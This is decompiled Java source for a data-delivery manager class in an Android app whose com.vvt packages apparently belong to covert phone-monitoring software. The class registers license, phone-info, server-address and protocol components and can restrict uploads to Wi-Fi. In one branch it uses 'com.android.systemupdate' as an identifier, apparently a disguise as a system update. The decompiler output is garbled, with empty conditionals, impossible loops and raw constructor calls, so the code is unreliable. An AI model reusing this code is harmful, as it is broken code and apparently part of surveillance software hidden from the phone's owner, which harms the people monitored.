package com.vvt.datadeliverymanager;

import android.content.Context;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.networkinfo.DataConnectionType;
import com.vvt.phoenix.prot.command.l;

public class b
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private k d;
  private com.vvt.datadeliverymanager.b.b e;
  private j f;
  private Context g;
  private String h;
  private RunningMode i;
  private com.vvt.phoenix.prot.c j;
  private com.vvt.connectionhistorymanager.a k;
  private com.vvt.datadeliverymanager.a.b l;
  private com.vvt.datadeliverymanager.a.d m;
  private com.vvt.server_address_manager.a n;
  private com.vvt.license.a o;
  private com.vvt.phoneinfo.a p;
  private com.vvt.productinfo.a q;
  private FxDeliveryMethod r;
  private com.vvt.networkinfo.a s;
  private com.vvt.c.c t;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = a.b;
      c = a.d;
      return;
    }
  }
  
  public b(Context paramContext, String paramString, RunningMode paramRunningMode)
  {
    this.g = paramContext;
    this.h = paramString;
    this.i = paramRunningMode;
  }
  
  private boolean b(h paramh)
  {
    boolean bool1 = false;
    boolean bool2 = true;
    Object localObject1 = DataConnectionType.NONE;
    localObject1 = paramh.c();
    int i1 = ((com.vvt.phoenix.prot.command.b)localObject1).a();
    Object localObject2 = new com/vvt/phoenix/prot/command/l;
    ((l)localObject2).<init>();
    int i2 = ((l)localObject2).a();
    if (i1 == i2) {}
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return bool2;
      localObject1 = c.a;
      localObject2 = this.r;
      i2 = ((FxDeliveryMethod)localObject2).ordinal();
      i1 = localObject1[i2];
      switch (i1)
      {
      case 1: 
      default: 
        bool2 = false;
        break;
      case 2: 
        localObject1 = this.s.a();
        localObject2 = DataConnectionType.WIFI;
        if (localObject1 != localObject2) {
          bool2 = false;
        }
        break;
      }
    }
  }
  
  private void c()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.f;
    Context localContext = this.g;
    String str = this.h;
    localObject = k.a((j)localObject, localContext, str);
    this.d = ((k)localObject);
    localObject = this.d;
    bool = ((k)localObject).a();
    if (!bool)
    {
      bool = b;
      if (bool) {}
      bool = b;
      if (bool) {}
      localObject = this.d;
      ((k)localObject).b();
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  public void a()
  {
    Object localObject1 = this.e;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = this.h;
      localObject1 = com.vvt.datadeliverymanager.b.b.a((Context)localObject1, (String)localObject2);
      this.e = ((com.vvt.datadeliverymanager.b.b)localObject1);
    }
    localObject1 = new com/vvt/datadeliverymanager/j;
    ((j)localObject1).<init>();
    this.f = ((j)localObject1);
    localObject1 = this.f;
    Object localObject2 = this.j;
    ((j)localObject1).a((com.vvt.phoenix.prot.c)localObject2);
    localObject1 = this.f;
    localObject2 = this.k;
    ((j)localObject1).a((com.vvt.connectionhistorymanager.a)localObject2);
    localObject1 = this.f;
    localObject2 = this.o;
    ((j)localObject1).a((com.vvt.license.a)localObject2);
    localObject1 = this.f;
    localObject2 = this.l;
    ((j)localObject1).a((com.vvt.datadeliverymanager.a.b)localObject2);
    localObject1 = this.f;
    localObject2 = this.n;
    ((j)localObject1).a((com.vvt.server_address_manager.a)localObject2);
    localObject1 = this.f;
    localObject2 = this.m;
    ((j)localObject1).a((com.vvt.datadeliverymanager.a.d)localObject2);
    localObject1 = this.f;
    localObject2 = this.p;
    ((j)localObject1).a((com.vvt.phoneinfo.a)localObject2);
    localObject1 = this.f;
    localObject2 = this.q;
    ((j)localObject1).a((com.vvt.productinfo.a)localObject2);
    localObject1 = this.f;
    localObject2 = this.t;
    ((j)localObject1).a((com.vvt.c.c)localObject2);
    this.e.a();
  }
  
  public void a(int paramInt, com.vvt.datadeliverymanager.a.a parama)
  {
    this.e.a(paramInt, parama);
  }
  
  public void a(FxDeliveryMethod paramFxDeliveryMethod)
  {
    this.r = paramFxDeliveryMethod;
  }
  
  public void a(com.vvt.c.c paramc)
  {
    this.t = paramc;
  }
  
  public void a(com.vvt.connectionhistorymanager.a parama)
  {
    this.k = parama;
  }
  
  public void a(com.vvt.datadeliverymanager.a.b paramb)
  {
    this.l = paramb;
  }
  
  public void a(com.vvt.datadeliverymanager.a.d paramd)
  {
    this.m = paramd;
  }
  
  public void a(h paramh)
  {
    for (;;)
    {
      boolean bool1;
      try
      {
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if ((bool1) && (paramh == null)) {
          break label330;
        }
        bool1 = b;
        if (bool1) {}
        bool1 = b(paramh);
        Object localObject3;
        Object localObject4;
        if (bool1)
        {
          localObject1 = this.e;
          ((com.vvt.datadeliverymanager.b.b)localObject1).a(paramh);
          c();
          localObject1 = this.i;
          localObject3 = RunningMode.FULL;
          if (localObject1 == localObject3)
          {
            localObject1 = new com/vvt/j/c;
            ((com.vvt.j.c)localObject1).<init>();
            localObject3 = "com.android.systemupdate";
            localObject4 = this.h;
            localObject1 = ((com.vvt.j.c)localObject1).a((String)localObject3, (String)localObject4);
            boolean bool2 = a;
            if (bool2) {}
            localObject3 = new com/vvt/datadeliverymanager/d;
            ((d)localObject3).<init>();
            localObject4 = this.j;
            localObject4 = ((com.vvt.phoenix.prot.c)localObject4).a;
            bool1 = ((d)localObject3).a((String)localObject1, (com.vvt.http.a)localObject4);
            if (bool1)
            {
              localObject1 = "52";
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            localObject1 = new com/vvt/j/c;
            ((com.vvt.j.c)localObject1).<init>();
            localObject3 = this.g;
            localObject1 = ((com.vvt.j.c)localObject1).a((Context)localObject3);
            continue;
          }
          localObject1 = "/salwwo";
          continue;
        }
        Object localObject1 = paramh.d();
        if (localObject1 != null)
        {
          localObject3 = new com/vvt/datadeliverymanager/i;
          ((i)localObject3).<init>();
          int i1 = 0;
          localObject4 = null;
          ((i)localObject3).a(null);
          localObject4 = paramh.j();
          ((i)localObject3).a((DataProviderType)localObject4);
          i1 = 0;
          localObject4 = null;
          ((i)localObject3).a(null);
          i1 = 65179;
          ((i)localObject3).a(i1);
          localObject4 = "Allow Wi-Fi delivery only";
          ((i)localObject3).a((String)localObject4);
          i1 = 0;
          localObject4 = null;
          ((i)localObject3).b(false);
          i1 = 0;
          localObject4 = null;
          ((i)localObject3).a(false);
          i1 = paramh.a();
          ((i)localObject3).b(i1);
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((i)localObject3);
          continue;
        }
        bool1 = c;
      }
      finally {}
      if (bool1)
      {
        continue;
        label330:
        bool1 = c;
        if (!bool1) {}
      }
    }
  }
  
  public void a(com.vvt.license.a parama)
  {
    this.o = parama;
  }
  
  public void a(com.vvt.networkinfo.a parama)
  {
    this.s = parama;
  }
  
  public void a(com.vvt.phoenix.prot.c paramc)
  {
    this.j = paramc;
  }
  
  public void a(com.vvt.phoneinfo.a parama)
  {
    this.p = parama;
  }
  
  public void a(com.vvt.productinfo.a parama)
  {
    this.q = parama;
  }
  
  public void a(com.vvt.server_address_manager.a parama)
  {
    this.n = parama;
  }
  
  public boolean a(int paramInt)
  {
    return this.e.a(paramInt);
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    c();
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */